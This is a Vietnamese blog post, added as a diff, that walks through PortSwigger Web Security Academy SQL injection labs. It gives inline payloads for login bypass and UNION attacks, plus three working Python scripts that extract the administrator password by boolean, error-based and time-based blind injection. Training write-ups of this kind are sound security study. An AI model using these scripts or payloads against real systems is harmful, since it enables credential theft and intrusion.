@@ -1,0 +1,345 @@
+---
+layout: post
+title: SQL Injection
+date: 2025-07-22 12:00:00 +0700
+tags: PortSwigger sqli ServerSide
+categories: jekyll update
+---
+
+## LAB 01 
+
+![image](/assets/images/PortSwigger/sqli/image1.png)
+
+Trong lab này khi tìm kiếm thì nó sẽ thực hiện câu query trên. 
+
+Nên mình truyền payload sau: `' OR 1=1-- -`
+
+![image](/assets/images/PortSwigger/sqli/image2.png)
+
+#### Nguyên nhân gây lỗi
+
+Do câu query viết dưới dạng nối chuỗi.
+
+## LAB02 
+
+![image](/assets/images/PortSwigger/sqli/image3.png)
+
+Trong lab này mình phải bypass login. Và do đó, mình thử các payload như `'` hay `"` để biết xem nó có viết nối chuỗi ko. Nhưng kết quả ko trả về lỗi gì. 
+
+Cho nên mình dùng các payload như sau: `administrator'-- -` hoặc `administrator"-- -` inject vào phần `username`
+
+Sau khi, thử payload `administrator'-- -` thì vào được account `admin`
+
+![image](/assets/images/PortSwigger/sqli/image4.png)
+
+## LAB03 
+
+Trong lab này, mình phải lấy được version của database.
+
+Cho nên truyền payload `' ORDER BY <số_cột>-- -` để thực hiện tấn công theo câu lệnh `UNION`
+
+![image](/assets/images/PortSwigger/sqli/image5.png)
+
+Dò 3 thì nó lỗi cho nên câu query đầu nó chỉ có 2 cột. 
+Rồi mình phải xác định cột nào có thể chứa chuỗi hay là số. 
+Nhưng mà cả hai cột đều chuỗi.
+
+![image](/assets/images/PortSwigger/sqli/image6.png)
+
+Để lấy được version của database phải dựa vào cú pháp từng loại DB. Và DB đang khai thác là Oracle. 
+
+![image](/assets/images/PortSwigger/sqli/image7.png)
+
+Nên truyền payload vào như sau:
+
+![image](/assets/images/PortSwigger/sqli/image8.png)
+
+## LAB04 
+
+Trong lab này tương tự như LAB03 nhưng kích hoạt trên database khác thôi. 
+
+![image](/assets/images/PortSwigger/sqli/image9.png)
+
+## LAB05 
+
+Lab này phải liệt kê nội dung của database trên các DB ko phải Oracle. 
+
+Cũng thực hiện dò cột và tấn công UNION. Sau khi dò xong thì cũng phải biết DB mình đang dùng là loại nào. Nên thử select các version.
+
+![image](/assets/images/PortSwigger/sqli/image10.png)
+
+Nó dùng `PostgreSQL` thì phải khai thác theo loại DB này. 
+
+Truyền payload sau để có lấy `table_name`
+
+![image](/assets/images/PortSwigger/sqli/image11.png)
+
+Tiếp theo là lấy tên cột. 
+
+![image](/assets/images/PortSwigger/sqli/image12.png)
+
+Từ đây, có thể trích xuất thông tin. 
+
+![image](/assets/images/PortSwigger/sqli/image13.png)
+
+## LAB06 
+
+Lab này tương tự lab5 nhưng sẽ trên DB Oracle. 
+
+Tương tự các bước như lấy tên bảng, tên cột và trích xuất dữ liệu.
+
+![image](/assets/images/PortSwigger/sqli/image14.png)
+
+Từ đây lấy được tên bảng. 
+
+![image](/assets/images/PortSwigger/sqli/image15.png)
+
+Và lấy tên cột. 
+
+![image](/assets/images/PortSwigger/sqli/image16.png)
+
+Cuối cùng là trích xuất data.
+
+![image](/assets/images/PortSwigger/sqli/image17.png)
+
+## LAB07 
+
+Lab này mình phải xác định số cột. Thì mình dò theo payload sau. 
+
+![image](/assets/images/PortSwigger/sqli/image18.png)
+
+## LAB08 
+
+Lab này xác định số cột và cột nào có thể chứa chuỗi. 
+
+![image](/assets/images/PortSwigger/sqli/image19.png)
+
+## LAB09 
+
+Lab này thì làm tương tự trích xuất data.
+
+![image](/assets/images/PortSwigger/sqli/image20.png)
+
+## LAB10 
+
+Lab này cũng trích xuất data và loại DB này là PostgreSQL. 
+
+![image](/assets/images/PortSwigger/sqli/image21.png)
+
+![image](/assets/images/PortSwigger/sqli/image22.png)
+
+![image](/assets/images/PortSwigger/sqli/image23.png)
+
+## LAB11 
+
+Lab này liên quan đến Blind SQLi, liên quan đến trang login lúc nào cũng có `Welcomeback!`
+
+Nên mình thử inject như sau: 
+
+![image](/assets/images/PortSwigger/sqli/image24.png)
+
+![image](/assets/images/PortSwigger/sqli/image25.png)
+
+Và mục tiêu bài này cũng chỉ để lấy password của administrator. Cho nên mình viết script như sau. 
+
+```python= 
+import requests 
+import sys 
+
+def send_requests(payload):
+    burp0_url = "https://0a7a00320368fdfa808a94b500110036.web-security-academy.net:443/"
+    burp0_cookies = {"TrackingId": f"OtnJwcRuDcx7K8wH' {payload}", "session": "EoLrMPQY699qQw5pIWM1HPX7jPAjZGcl"}
+    burp0_headers = {"Cache-Control": "max-age=0", "Sec-Ch-Ua": "\"Not)A;Brand\";v=\"8\", \"Chromium\";v=\"138\"", "Sec-Ch-Ua-Mobile": "?0", "Sec-Ch-Ua-Platform": "\"Windows\"", "Accept-Language": "en-US,en;q=0.9", "Upgrade-Insecure-Requests": "1", "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7", "Sec-Fetch-Site": "same-origin", "Sec-Fetch-Mode": "navigate", "Sec-Fetch-User": "?1", "Sec-Fetch-Dest": "document", "Referer": "https://0a7a00320368fdfa808a94b500110036.web-security-academy.net/login", "Accept-Encoding": "gzip, deflate, br", "Priority": "u=0, i"}
+    res = requests.get(burp0_url, headers=burp0_headers, cookies=burp0_cookies)
+    return res.text
+
+length_pw = 0 
+for i in range(1, 50):
+    payload = f"AND (SELECT length(password) FROM users WHERE username=\'administrator\') < {i}-- -"
+    response = send_requests(payload)
+    print(f"🧪 Đang thử với i = {i}", end='\r')
+    if "Welcome back!" in response:
+        length_pw = i
+        print(f"✅ Độ dài password: {i}")
+        break
+
+password = ""
+for i in range(1, length_pw + 1):
+    left = 32 
+    right = 126 
+    while left <= right: 
+        mid = (left + right) // 2
+        payload = f"AND ASCII(SUBSTR((SELECT password FROM users WHERE username=\'administrator\'),{i},1)) > {mid}-- -"
+        response = send_requests(payload)
+        if "Welcome back!" in response:
+            left = mid + 1 
+        else: 
+            right = mid - 1
+    password += chr(left) 
+    sys.stdout.write(f"\r✅ Password là: {password}")
+    sys.stdout.flush()
+```
+
+![image](/assets/images/PortSwigger/sqli/image26.png)
+
+## LAB12 
+
+Lab này cũng là blind SQL nhưng nó chỉ hiển thị lỗi hoặc không dựa vào câu điều kiện ta đưa vào. 
+
+```python=
+import requests 
+import sys 
+from urllib.parse import quote 
+
+def send_requests(payload):
+    encoded = quote(payload, safe='')
+    burp0_url = "https://0adf005303f9a1c48033081000dc00f9.web-security-academy.net:443/"
+    burp0_cookies = {"session": "TezivjQqU9jPCo0xTexLdoaV7CK0Q1Vn", "TrackingId": f"jt1UFufs2K7hjyZ8{encoded}"}
+    burp0_headers = {"Sec-Ch-Ua": "\"Not)A;Brand\";v=\"8\", \"Chromium\";v=\"138\"", "Sec-Ch-Ua-Mobile": "?0", "Sec-Ch-Ua-Platform": "\"Windows\"", "Accept-Language": "en-US,en;q=0.9", "Upgrade-Insecure-Requests": "1", "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7", "Sec-Fetch-Site": "same-origin", "Sec-Fetch-Mode": "navigate", "Sec-Fetch-User": "?1", "Sec-Fetch-Dest": "document", "Referer": "https://0adf005303f9a1c48033081000dc00f9.web-security-academy.net/", "Accept-Encoding": "gzip, deflate, br", "Priority": "u=0, i"}
+    res = requests.get(burp0_url, headers=burp0_headers, cookies=burp0_cookies)
+    return res.status_code
+    
+    
+length_pw = 0 
+for i in range(1, 50):
+    payload = f"'||(SELECT CASE WHEN (username='administrator' AND length(password) < {i}) THEN TO_CHAR(1/0) ELSE 'a' END FROM users WHERE ROWNUM=1)||'"
+    response = send_requests(payload)
+    print(f"🧪 Đang thử với i = {i}", end='\r')
+    if response == 500:
+        length_pw = i
+        print(f"✅ Độ dài password: {i}")
+        break
+
+password = ""
+for i in range(1, length_pw + 1):
+    left = 32 
+    right = 126 
+    while left <= right: 
+        mid = (left + right) // 2
+        payload = f"'||(SELECT CASE WHEN (username='administrator' AND ascii(SUBSTR(password,{i},1)) > {mid}) THEN TO_CHAR(1/0) ELSE 'a' END FROM users WHERE ROWNUM=1)||'"
+        response = send_requests(payload)
+        if response == 500:
+            left = mid + 1 
+        else: 
+            right = mid - 1
+    password += chr(left) 
+    sys.stdout.write(f"\r✅ Password là: {password}")
+    sys.stdout.flush()
+``` 
+
+![image](/assets/images/PortSwigger/sqli/image27.png)
+
+## LAB13 
+
+Lab này chỉ để kích hoạt time delay, và mình phải dò payload qua các loại DB. 
+
+![image](/assets/images/PortSwigger/sqli/image28.png)
+
+## LAB14 
+
+Lab này tương tự lab13 nhưng mình phải dùng câu điều kiện để có thể trích xuất dữ liệu. 
+Mình thử qua các payload và xác định đây là loại DB postgreSQL. 
+
+```python=
+import requests 
+import sys
+import time 
+from urllib.parse import quote 
+
+def send_requests(payload):
+    encoded = quote(payload, safe='')
+    burp0_url = "https://0aaa0079047a840c82135bfa00bd0098.web-security-academy.net:443/"
+    burp0_cookies = {"TrackingId": f"F6yWayH4TIfZGUQN{encoded}", "session": "OTIV0PYgxUc6tWb0op6nWj6OOd26sOPc"}
+    burp0_headers = {"Sec-Ch-Ua": "\"Not)A;Brand\";v=\"8\", \"Chromium\";v=\"138\"", "Sec-Ch-Ua-Mobile": "?0", "Sec-Ch-Ua-Platform": "\"Windows\"", "Accept-Language": "en-US,en;q=0.9", "Upgrade-Insecure-Requests": "1", "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7", "Sec-Fetch-Site": "same-origin", "Sec-Fetch-Mode": "navigate", "Sec-Fetch-User": "?1", "Sec-Fetch-Dest": "document", "Referer": "https://0aaa0079047a840c82135bfa00bd0098.web-security-academy.net/filter?category=Gifts", "Accept-Encoding": "gzip, deflate, br", "Priority": "u=0, i"}
+    start_time = time.time()
+    requests.get(burp0_url, headers=burp0_headers, cookies=burp0_cookies)
+    end_time = time.time() - start_time 
+    return end_time 
+    
+length_pw = 0 
+for i in range(1, 50):
+    payload = f"'|| (SELECT CASE WHEN (username='administrator' AND length(password)={i}) THEN pg_sleep(3) ELSE pg_sleep(0) END FROM users)--"
+    response = send_requests(payload)
+    print(f"🧪 Đang thử với i = {i}", end='\r')
+    if response > 2:
+        length_pw = i
+        print(f"✅ Độ dài password: {i}")
+        break
+
+password = ""
+for i in range(1, length_pw + 1):
+    left = 32 
+    right = 126 
+    while left <= right: 
+        mid = (left + right) // 2
+        payload = f"'||(SELECT CASE WHEN (username='administrator' AND ascii(SUBSTR(password,{i},1)) > {mid}) THEN pg_sleep(3) ELSE pg_sleep(0) END FROM users)--"
+        response = send_requests(payload)
+        if response > 2:
+            left = mid + 1 
+        else: 
+            right = mid - 1
+    password += chr(left) 
+    sys.stdout.write(f"\r✅ Password là: {password}")
+    sys.stdout.flush()
+``` 
+![image](/assets/images/PortSwigger/sqli/image29.png)
+
+## LAB15 
+
+Lab này là một kỹ thuật `out-of-band` của SQLi. Mục tiêu của lab này là gửi 1 request đến 1 DNS mà do attacker đã dựng sẵn. Ở đây mình dùng Burp Collaborator. 
+
+Mình tạo ra 1 domain trước. 
+
+![image](/assets/images/PortSwigger/sqli/image30.png)
+
+Và sau đó, mình thử các payload để xác định loại DB mà payload đó phải được gửi tới domain đã dựng. 
+
+![image](/assets/images/PortSwigger/sqli/image31.png)
+
+![image](/assets/images/PortSwigger/sqli/image32.png)
+
+## LAB16 
+
+Lab này giống lab trên cũng dùng kỹ thuật out-of-band nhưng mình phải trích xuất lấy dữ liệu. 
+
+Cũng làm tương tự nhưng thêm payload vào để trích xuất password của administrator vào phần đầu của domain để thực hiện query. 
+
+![image](/assets/images/PortSwigger/sqli/image33.png)
+
+Phần đầu trước domain là password. 
+
+## LAB17 
+
+Lab này ta phải khai thác dựa trên 1 web sử dụng XML. Và còn có cơ chế bảo vệ của WAF nữa. Và mình khai thác dựa trên 2 tham số `productId` và `storeId`. 
+
+Đầu tiên, mình thử inject vào từng trường xem như thế nào. 
+
+![image](/assets/images/PortSwigger/sqli/image34.png)
+
+![image](/assets/images/PortSwigger/sqli/image35.png)
+
+Cả hai trường đều bị WAF chặn. 
+
+Nhưng nếu mình dùng tool Hackvertor, để encode thì xem như thế nào. 
+
+![image](/assets/images/PortSwigger/sqli/image36.png)
+
+Sau đó, mình thử truyền lại tại tab repeater. 
+
+![image](/assets/images/PortSwigger/sqli/image37.png)
+
+Nó vẫn trả về kết quả bình thường như vậy nó hoạt động bình thường sau khi encode nên mình thay nó lại bằng payload như sau: `1 UNION SELECT NULL`
+
+![image](/assets/images/PortSwigger/sqli/image38.png)
+
+Như vậy mình thử kiểm tra xem cột này có phải chuỗi ko. 
+
+![image](/assets/images/PortSwigger/sqli/image39.png)
+
+Sau cùng, mình sẽ extract được password. 
+
+![image](/assets/images/PortSwigger/sqli/image40.png)
+
+Kết quả mình khai thác được. 
+
+![image](/assets/images/PortSwigger/sqli/image41.png)
